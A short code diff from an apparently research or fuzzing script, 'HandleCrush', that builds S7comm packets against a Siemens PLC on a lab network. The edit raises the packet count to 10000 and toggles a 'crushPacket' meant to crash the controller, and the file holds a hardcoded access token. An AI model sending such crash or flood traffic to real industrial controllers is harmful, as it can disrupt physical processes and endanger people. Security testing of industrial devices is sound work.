@@ -51,7 +51,7 @@ class HandleCrush(Base):
         time.sleep(2)
 
         self.__openPlugin()
-        # self.logger.info("Switch on Plugin success!")
+        # self.logger.info("Switc h on Plugin success!")
 
         i = self.__maxWaitCount
 
@@ -106,7 +106,7 @@ class HandleCrush(Base):
 
 
 
-target = MyS7Client(name="test", ip="192.168.1.188", src_ip="192.168.1.101", rack=0, slot=1)
+target = MyS7Client(name="test", ip="192.168.1.188", src_ip="192.168.1.105", rack=0, slot=1)
 
 pkt = TPKT() / COTPDT( EOT=1 ) / S7Header(ROSCTR="UserData",
                                         Parameters=S7ReadSZLParameterReq(),
@@ -129,8 +129,8 @@ crushPacket = TPKT() / COTPDT( EOT=1 ) /  S7Header(ROSCTR="Job",
 # target.connect()
 # a = input("continue")
 
-packets = [pkt for i in range(10) ]
-packets[2] = crushPacket
+packets = [pkt for i in range(10000) ]
+# packets[2] = crushPacket
 
 ip = "192.168.1.134"
 token = "28aa291e4d034fe9a955d6e735153ae6"
